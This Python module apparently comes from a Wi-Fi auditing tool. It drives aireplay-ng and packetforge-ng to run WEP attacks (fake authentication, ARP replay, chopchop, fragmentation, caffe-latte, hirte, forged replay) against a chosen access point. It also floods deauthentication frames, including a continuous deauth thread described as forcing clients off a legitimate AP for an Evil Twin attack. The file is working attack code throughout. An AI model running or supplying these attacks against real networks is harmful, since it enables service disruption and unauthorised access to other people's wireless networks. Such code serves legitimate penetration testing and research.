#!/usr/bin/env python
# -*- coding: utf-8 -*-

from .dependency import Dependency
from ..config import Configuration
from ..util.process import Process
from ..util.timer import Timer

import os
import time
import re
from threading import Thread, Lock


class WEPAttackType:
    """ Enumeration of different WEP attack types """
    fakeauth = 0
    replay = 1
    chopchop = 2
    fragment = 3
    caffelatte = 4
    p0841 = 5
    hirte = 6
    forgedreplay = 7

    def __init__(self, var):
        """
            Sets appropriate attack name/value given an input.
            Args:
                var - Can be a string, number, or WEPAttackType object
                      This object's name & value is set depending on var.
        """
        self.value = None
        self.name = None
        if type(var) is int:
            for (name, value) in list(WEPAttackType.__dict__.items()):
                if type(value) is int and value == var:
                    self.name = name
                    self.value = value
                    return
            raise Exception('Attack number %d not found' % var)
        elif type(var) is str:
            for (name, value) in list(WEPAttackType.__dict__.items()):
                if type(value) is int and name == var:
                    self.name = name
                    self.value = value
                    return
            raise Exception(f'Attack name {var} not found')
        elif type(var) == WEPAttackType:
            self.name = var.name
            self.value = var.value
        else:
            raise Exception('Attack type not supported')

    def __str__(self):
        return self.name


class Aireplay(Thread, Dependency):
    dependency_required = True
    dependency_name = 'aireplay-ng'
    dependency_url = 'https://www.aircrack-ng.org/install.html'
    
    # Track if native Scapy deauth is available
    _native_deauth_available = None
    
    @classmethod
    def _can_use_native_deauth(cls) -> bool:
        """Check if native Scapy deauth is available."""
        if cls._native_deauth_available is None:
            try:
                from ..native.deauth import ScapyDeauth
                cls._native_deauth_available = ScapyDeauth.is_available()
            except ImportError:
                cls._native_deauth_available = False
        return cls._native_deauth_available

    def __init__(self, target, attack_type, client_mac=None, replay_file=None):
        """
            Starts aireplay process.
            Args:
                target - Instance of Target object, AP to attack.
                attack_type - str, e.g. 'fakeauth', 'arpreplay', etc.
                client_mac - MAC address of an associated client.
        """
        super().__init__()  # Init the parent Thread

        self.error = None
        self.status = None
        self.stdout = None
        self.xor_percent = None

        self.target = target
        self.output_file = Configuration.temp(f'aireplay_{attack_type}.output')
        self.attack_type = WEPAttackType(attack_type).value
        self.cmd = Aireplay.get_aireplay_command(self.target,
                                                 attack_type,
                                                 client_mac=client_mac,
                                                 replay_file=replay_file)
        self.output_fh = open(self.output_file, 'a')
        try:
            self.pid = Process(self.cmd,
                               stdout=self.output_fh,
                               stderr=Process.devnull(),
                               cwd=Configuration.temp())
        except (OSError, RuntimeError):
            try:
                self.output_fh.close()
            except OSError:
                pass
            raise
        self.start()

    def is_running(self):
        return hasattr(self, 'pid') and self.pid and self.pid.poll() is None

    def stop(self):
        """ Stops aireplay process """
        if hasattr(self, 'pid') and self.pid and self.pid.poll() is None:
            self.pid.interrupt()
        if hasattr(self, 'output_fh') and self.output_fh and not self.output_fh.closed:
            try:
                self.output_fh.close()
            except OSError:
                pass


    def get_output(self):
        """ Returns stdout from aireplay process """
        return self.stdout

    def run(self):
        try:
            self._run_loop()
        finally:
            self.stop()

    def _run_loop(self):
        self.stdout = ''
        self.xor_percent = '0%'
        while self.pid.poll() is None:
            time.sleep(0.1)
            if not os.path.exists(self.output_file):
                continue
            # Read output file & clear output file
            try:
                with open(self.output_file, 'r+') as fid:
                    lines = fid.read()
                    self.stdout += lines
                    fid.seek(0)
                    fid.truncate()
            except (OSError, IOError):
                continue

            if Configuration.verbose > 1 and lines.strip() != '':
                from ..util.color import Color
                Color.pl('\n{P} [?] aireplay output:\n     %s{W}' % lines.strip().replace('\n', '\n     '))

            for line in lines.split('\n'):
                line = line.replace('\r', '').strip()
                if line == '':
                    continue
                if 'Notice: got a deauth/disassoc packet' in line:
                    self.error = 'Not associated (needs fakeauth)'

                if self.attack_type == WEPAttackType.fakeauth:
                    # Look for fakeauth status. Potential Output lines:
                    # (START): 00:54:58  Sending Authentication Request (Open System)
                    if 'Sending Authentication Request ' in line or 'Please specify an ESSID' in line:
                        self.status = None  # Reset
                    elif 'Got a deauthentication packet!' in line:
                        self.status = False
                    elif 'Sending Authentication Request ' not in line \
                            and 'Please specify an ESSID' not in line \
                            and 'Got a deauthentication packet!' not in line \
                            and 'association successful :-)' in line.lower():
                        self.status = True
                elif self.attack_type == WEPAttackType.chopchop:
                    # Look for chopchop status. Potential output lines:

                    # (START)  Read 178 packets...
                    read_re = re.compile(r'Read (\d+) packets')
                    if matches := read_re.match(line):
                        self.status = f'Waiting for packet (read {matches[1]})...'

                    # Sent 1912 packets, current guess: 70...
                    sent_re = re.compile(r'Sent (\d+) packets, current guess: (\w+)...')
                    if matches := sent_re.match(line):
                        self.status = f'Generating .xor ({self.xor_percent})... current guess: {matches[2]}'

                    # (DURING) Offset   52 (54% done) | xor = DE | pt = E0 |  152 frames written in  2782ms
                    offset_re = re.compile(r'Offset.*\(\s*(\d+%) done\)')
                    if matches := offset_re.match(line):
                        self.xor_percent = matches[1]
                        self.status = f'Generating .xor ({self.xor_percent})...'

                    # (DONE)   Saving keystream in replay_dec-0516-202246.xor
                    saving_re = re.compile(r'Saving keystream in (.*\.xor)')
                    if matches := saving_re.match(line):
                        self.status = matches[1]

                    # (ERROR) fakeauth required
                    if 'try running aireplay-ng in authenticated mode' in line:
                        self.status = 'fakeauth is required and you are not authenticated'

                elif self.attack_type == WEPAttackType.fragment:
                    # Parse fragment output, update self.status

                    # (START)  Read 178 packets...
                    read_re = re.compile(r'Read (\d+) packets')
                    if matches := read_re.match(line):
                        self.status = f'Waiting for packet (read {matches[1]})...'

                    # 01:08:15  Waiting for a data packet...
                    if 'Waiting for a data packet' in line:
                        self.status = 'waiting for packet'

                    # Read 207 packets...
                    trying_re = re.compile(r'Trying to get (\d+) bytes of a keystream')
                    if matches := trying_re.match(line):
                        self.status = f'trying to get {matches[1]}b of a keystream'

                    # 01:08:17  Sending fragmented packet
                    if 'Sending fragmented packet' in line:
                        self.status = 'sending packet'

                    # 01:08:37  Still nothing, trying another packet...
                    if 'Still nothing, trying another packet' in line:
                        self.status = 'sending another packet'

                    # XX:XX:XX  Trying to get 1500 bytes of a keystream
                    trying_re = re.compile(r'Trying to get (\d+) bytes of a keystream')
                    if matches := trying_re.match(line):
                        self.status = f'trying to get {matches[1]}b of a keystream'

                    # XX:XX:XX  Got RELAYED packet!!
                    if 'Got RELAYED packet' in line:
                        self.status = 'got relayed packet'

                    # XX:XX:XX  That's our ARP packet!
                    if 'Thats our ARP packet' in line:
                        self.status = 'relayed packet was our'

                    # XX:XX:XX  Saving keystream in fragment-0124-161129.xor
                    saving_re = re.compile(r'Saving keystream in (.*\.xor)')
                    if matches := saving_re.match(line):
                        self.status = f'saving keystream to {matches[1]}'
                        # XX:XX:XX  Now you can build a packet with packetforge-ng out of that 1500 bytes keystream

                else:  # Replay, forged replay, etc.
                    # Parse Packets Sent & PacketsPerSecond. Possible output lines:
                    # Read 55 packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0 pps)
                    # Read 4467 packets (got 1425 ARP requests and 1417 ACKs), sent 1553 packets...(100 pps)
                    read_re = re.compile(r'Read (\d+) packets \(got (\d+) ARP requests and (\d+) ACKs\), sent (\d+) packets...\((\d+) pps\)')
                    if matches := read_re.match(line):
                        pps = matches[5]
                        self.status = 'Waiting for packet...' if pps == '0' else f'Replaying @ {pps}/sec'

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.stop()

    def __del__(self):
        try:
            if hasattr(self, 'output_fh') and self.output_fh and not self.output_fh.closed:
                self.output_fh.close()
        except OSError:
            pass
        self.stop()

    @staticmethod
    def get_aireplay_command(target, attack_type, client_mac=None, replay_file=None):
        """
            Generates aireplay command based on target and attack type
            Args:
                target      - Instance of Target object, AP to attack.
                attack_type - int, str, or WEPAttackType instance.
                client_mac  - MAC address of an associated client.
                replay_file - .Cap file to replay via --arpreplay
        """

        # Interface is required at this point
        Configuration.initialize()
        if Configuration.interface is None:
            raise Exception('Wireless interface must be defined (-i)')

        cmd = ['aireplay-ng', '--ignore-negative-one']

        if client_mac is None and len(target.clients) > 0:
            # Client MAC wasn't specified, but there's an associated client. Use that.
            client_mac = target.clients[0].station

        # type(attack_type) might be str, int, or WEPAttackType.
        # Find the appropriate attack enum.
        attack_type = WEPAttackType(attack_type).value

        if attack_type == WEPAttackType.fakeauth:
            cmd.extend([
                '--fakeauth', '30',  # Fake auth every 30 seconds
                '-Q',  # Send re-association packets
                '-a', target.bssid
            ])
            if target.essid_known:
                cmd.extend(['-e', target.essid])
        elif attack_type == WEPAttackType.replay:
            cmd.extend([
                '--arpreplay',
                '-b', target.bssid,
                '-x', str(Configuration.wep_pps)
            ])
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.chopchop:
            cmd.extend([
                '--chopchop',
                '-b', target.bssid,
                '-x', str(Configuration.wep_pps),
                # '-m', '60', # Minimum packet length (bytes)
                # '-n', '82', # Maximum packet length
                '-F'  # Automatically choose first packet
            ])
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.fragment:
            cmd.extend([
                '--fragment',
                '-b', target.bssid,
                '-x', str(Configuration.wep_pps),
                '-m', '100',  # Minimum packet length (bytes)
                '-F'  # Automatically choose first packet
            ])
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.caffelatte:
            if len(target.clients) == 0:
                # Unable to carry out caffe-latte attack
                raise Exception('Client is required for caffe-latte attack')
            cmd.extend([
                '--caffe-latte',
                '-b', target.bssid,
                '-h', target.clients[0].station
            ])

        elif attack_type == WEPAttackType.p0841:
            cmd.extend([
                '--arpreplay',
                '-b', target.bssid,
                '-c', 'ff:ff:ff:ff:ff:ff',
                '-x', str(Configuration.wep_pps),
                '-F',  # Automatically choose first packet
                '-p', '0841'
            ])
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.hirte:
            if client_mac is None:
                # Unable to carry out hirte attack
                raise Exception('Client is required for hirte attack')
            cmd.extend([
                '--cfrag',
                '-h', client_mac
            ])
        elif attack_type == WEPAttackType.forgedreplay:
            if client_mac is None or replay_file is None:
                raise Exception('Client_mac and Replay_File are required for arp replay')
            cmd.extend([
                '--arpreplay',
                '-b', target.bssid,
                '-h', client_mac,
                '-r', replay_file,
                '-F',  # Automatically choose first packet
                '-x', str(Configuration.wep_pps)
            ])
        else:
            raise Exception(f'Unexpected attack type: {attack_type}')

        cmd.append(Configuration.interface)
        return cmd

    @staticmethod
    def get_xor():
        """ Finds the last .xor file in the directory """
        xor = None
        for fil in os.listdir(Configuration.temp()):
            if fil.startswith('replay_') and fil.endswith('.xor') or \
                    fil.startswith('fragment-') and fil.endswith('.xor'):
                xor = fil
        return xor

    @staticmethod
    def forge_packet(xor_file, bssid, station_mac):
        """ Forges packet from .xor file """
        forged_file = 'forged.cap'
        cmd = [
            'packetforge-ng',
            '-0',
            '-a', bssid,  # Target MAC
            '-h', station_mac,  # Client MAC
            '-k', '192.168.1.2',  # Dest IP
            '-l', '192.168.1.100',  # Source IP
            '-y', xor_file,  # Read PRNG from .xor file
            '-w', forged_file,  # Write to
            Configuration.interface
        ]

        (out, err) = Process.call(cmd, cwd=Configuration.temp())
        if out.strip() == f'Wrote packet to: {forged_file}':
            return forged_file
        from ..util.color import Color
        Color.pl('{!} {R}failed to forge packet from .xor file{W}')
        Color.pl('output:\n"%s"' % out)
        return None

    @classmethod
    def deauth(cls, target_bssid, essid=None, client_mac=None, num_deauths=None, timeout=2, interface=None, prefer_native=True):
        """
        Send deauthentication packets to a target.
        
        Uses native Scapy implementation when available, falls back to aireplay-ng.
        
        Args:
            target_bssid: BSSID of the target AP
            essid: ESSID of the target (optional)
            client_mac: Specific client to deauth (None = broadcast)
            num_deauths: Number of deauth packets to send
            timeout: Timeout in seconds
            interface: Wireless interface to use (None = use Configuration.interface)
            prefer_native: If True, prefer Scapy over aireplay-ng (default: True)
        
        Returns:
            Tuple of (success: bool, packets_sent: int) when using native,
            or None when using aireplay-ng (for backwards compatibility)
        """
        num_deauths = num_deauths or Configuration.num_deauths
        interface = interface or Configuration.interface
        
        # Try native Scapy deauth first
        if prefer_native and cls._can_use_native_deauth():
            try:
                from ..native.deauth import ScapyDeauth
                success, sent = ScapyDeauth.deauth(
                    interface=interface,
                    bssid=target_bssid,
                    client_mac=client_mac,
                    count=num_deauths,
                    verbose=Configuration.verbose > 1
                )
                if success:
                    if Configuration.verbose > 1:
                        from ..util.color import Color
                        Color.pl('{+} {C}Scapy{W}: sent {G}%d{W} deauth packets to {C}%s{W}' % (sent, target_bssid))
                    return success, sent
            except Exception as e:
                if Configuration.verbose > 1:
                    from ..util.color import Color
                    Color.pl('{!} {O}Native deauth failed, falling back to aireplay-ng: %s{W}' % str(e))
        
        # Fallback to aireplay-ng
        deauth_cmd = [
            'aireplay-ng',
            '-0',  # Deauthentication
            str(num_deauths),
            '--ignore-negative-one',
            '-a', target_bssid,  # Target AP
            '-D'  # Skip AP detection
        ]
        if client_mac is not None:
            # Station-specific deauth
            deauth_cmd.extend(['-c', client_mac])
        if essid:
            deauth_cmd.extend(['-e', essid])
        deauth_cmd.append(interface)
        proc = Process(deauth_cmd)
        while proc.poll() is None:
            if proc.running_time() >= timeout:
                proc.interrupt()
            time.sleep(0.2)
        
        return None  # aireplay-ng doesn't return packet count
    
    @classmethod
    def deauth_native(cls, target_bssid, client_mac=None, num_deauths=None, interface=None):
        """
        Send deauth using native Scapy implementation only.
        
        Args:
            target_bssid: BSSID of the target AP
            client_mac: Specific client to deauth (None = broadcast)
            num_deauths: Number of deauth packets to send
            interface: Wireless interface to use
            
        Returns:
            Tuple of (success: bool, packets_sent: int)
        """
        num_deauths = num_deauths or Configuration.num_deauths
        interface = interface or Configuration.interface
        
        if not cls._can_use_native_deauth():
            return False, 0
        
        try:
            from ..native.deauth import ScapyDeauth
            return ScapyDeauth.deauth(
                interface=interface,
                bssid=target_bssid,
                client_mac=client_mac,
                count=num_deauths
            )
        except Exception as e:
            if Configuration.verbose > 1:
                from ..util.color import Color
                Color.pl('{!} {O}deauth_native failed: %s{W}' % str(e))
            return False, 0


class ContinuousDeauth(Thread):
    """
    Continuous deauthentication attack for Evil Twin.

    Sends deauth packets at configurable intervals to force clients
    to disconnect from the legitimate AP. Can pause when clients
    connect to the rogue AP.
    
    Uses native Scapy implementation when available for better performance.
    """
    
    # Track if native Scapy deauth is available
    _native_available = None

    def __init__(self, target_bssid, interface, essid=None, client_mac=None,
                 interval=5, num_deauths=5, broadcast=True, prefer_native=True):
        """
        Initialize continuous deauth.

        Args:
            target_bssid: BSSID of the legitimate AP to deauth from
            interface: Wireless interface in monitor mode
            essid: ESSID of the target (optional)
            client_mac: Specific client to deauth (None = broadcast)
            interval: Seconds between deauth bursts
            num_deauths: Number of deauth packets per burst
            broadcast: If True, deauth all clients; if False, only target client_mac
            prefer_native: If True, prefer Scapy over aireplay-ng
        """
        super().__init__()
        self.daemon = True
        self._check_native()
        self.target_bssid = target_bssid
        self.interface = interface
        self.essid = essid
        self.client_mac = client_mac
        self.interval = interval
        self.num_deauths = num_deauths
        self.broadcast = broadcast
        self.prefer_native = prefer_native
        self._lock = Lock()
        self._running = False
        self._paused = False
        self.process = None
        self._total_deauths_sent = 0
        self._last_deauth_time = 0

        # Statistics
        self.start_time = None
        self.deauth_count = 0

    @property
    def running(self):
        with self._lock:
            return self._running

    @running.setter
    def running(self, value):
        with self._lock:
            self._running = value

    @property
    def paused(self):
        with self._lock:
            return self._paused

    @paused.setter
    def paused(self, value):
        with self._lock:
            self._paused = value

    @property
    def total_deauths_sent(self):
        with self._lock:
            return self._total_deauths_sent

    @total_deauths_sent.setter
    def total_deauths_sent(self, value):
        with self._lock:
            self._total_deauths_sent = value

    @property
    def last_deauth_time(self):
        with self._lock:
            return self._last_deauth_time

    @last_deauth_time.setter
    def last_deauth_time(self, value):
        with self._lock:
            self._last_deauth_time = value

    @classmethod
    def _check_native(cls):
        """Check if native Scapy deauth is available."""
        if cls._native_available is None:
            try:
                from ..native.deauth import ScapyDeauth
                cls._native_available = ScapyDeauth.is_available()
            except ImportError:
                cls._native_available = False
        return cls._native_available

    def run(self):
        """Main deauth loop."""
        self.running = True
        self.start_time = time.time()

        while self.running:
            try:
                # Check if paused
                if self.paused:
                    time.sleep(0.5)
                    continue

                # Check if it's time to send deauth
                current_time = time.time()
                if current_time - self.last_deauth_time >= self.interval:
                    self._send_deauth_burst()
                    self.last_deauth_time = current_time
                    self.deauth_count += 1

                time.sleep(0.5)

            except Exception as e:
                from ..util.color import Color
                Color.pl('{!} {R}Deauth error: %s{W}' % str(e))
                time.sleep(1)

    def _send_deauth_burst(self):
        """Send a burst of deauth packets using native or aireplay-ng."""
        client = self.client_mac if not self.broadcast else None
        
        # Try native Scapy first
        if self.prefer_native and self._native_available:
            try:
                from ..native.deauth import ScapyDeauth
                success, sent = ScapyDeauth.deauth(
                    interface=self.interface,
                    bssid=self.target_bssid,
                    client_mac=client,
                    count=self.num_deauths,
                    verbose=False
                )
                if success:
                    with self._lock:
                        self._total_deauths_sent += sent
                    return
            except Exception as e:
                if Configuration.verbose > 1:
                    from ..util.color import Color
                    Color.pl('{!} {O}Native deauth failed, falling back to aireplay-ng: %s{W}' % str(e))
        
        # Fallback to aireplay-ng
        try:
            deauth_cmd = [
                'aireplay-ng',
                '-0',  # Deauthentication
                str(self.num_deauths),
                '--ignore-negative-one',
                '-a', self.target_bssid,  # Target AP
                '-D'  # Skip AP detection
            ]

            # Add client-specific or broadcast deauth
            if client:
                deauth_cmd.extend(['-c', client])

            # Add ESSID if provided
            if self.essid:
                deauth_cmd.extend(['-e', self.essid])

            deauth_cmd.append(self.interface)

            # Execute deauth
            self.process = Process(deauth_cmd, devnull=True)

            # Wait for completion with timeout
            timeout = 3
            start = time.time()
            while self.process.poll() is None:
                if time.time() - start > timeout:
                    self.process.interrupt()
                    break
                time.sleep(0.1)

            with self._lock:
                self._total_deauths_sent += self.num_deauths

        except Exception as e:
            from ..util.color import Color
            Color.pl('{!} {R}Failed to send deauth: %s{W}' % str(e))

    def pause(self):
        """Pause deauthentication (e.g., when clients connect to rogue AP)."""
        self.paused = True

    def resume(self):
        """Resume deauthentication."""
        self.paused = False

    def is_paused(self):
        """Check if deauth is paused."""
        return self.paused

    def stop(self):
        """Stop continuous deauth."""
        self.running = False

        # Stop any running process
        if self.process and self.process.poll() is None:
            import contextlib
            with contextlib.suppress(Exception):
                self.process.interrupt()

        # Wait for thread to finish
        if self.is_alive():
            self.join(timeout=2)

    def get_stats(self):
        """
        Get deauth statistics.

        Returns:
            dict with statistics
        """
        elapsed = time.time() - self.start_time if self.start_time else 0
        return {
            'total_deauths': self.total_deauths_sent,
            'deauth_bursts': self.deauth_count,
            'elapsed_time': elapsed,
            'paused': self.paused,
            'running': self.running
        }

    @staticmethod
    def fakeauth(target, timeout=5, num_attempts=3):
        """
        Tries a one-time fake-authenticate with a target AP.
        Params:
            target (py.Target): Instance of py.Target
            timeout (int): Time to wait for fakeuth to succeed.
            num_attempts (int): Number of fakeauth attempts to make.
        Returns:
            (bool): True if fakeauth succeeds, otherwise False
        """

        cmd = [
            'aireplay-ng',
            '-1', '0',  # Fake auth, no delay
            '-a', target.bssid,
            '-T', str(num_attempts)
        ]
        if target.essid_known:
            cmd.extend(['-e', target.essid])
        cmd.append(Configuration.interface)
        fakeauth_proc = Process(cmd,
                                devnull=False,
                                cwd=Configuration.temp())

        timer = Timer(timeout)
        while fakeauth_proc.poll() is None and not timer.ended():
            time.sleep(0.1)
        if fakeauth_proc.poll() is None or timer.ended():
            fakeauth_proc.interrupt()
            return False

        output = fakeauth_proc.stdout()
        return 'association successful' in output.lower()
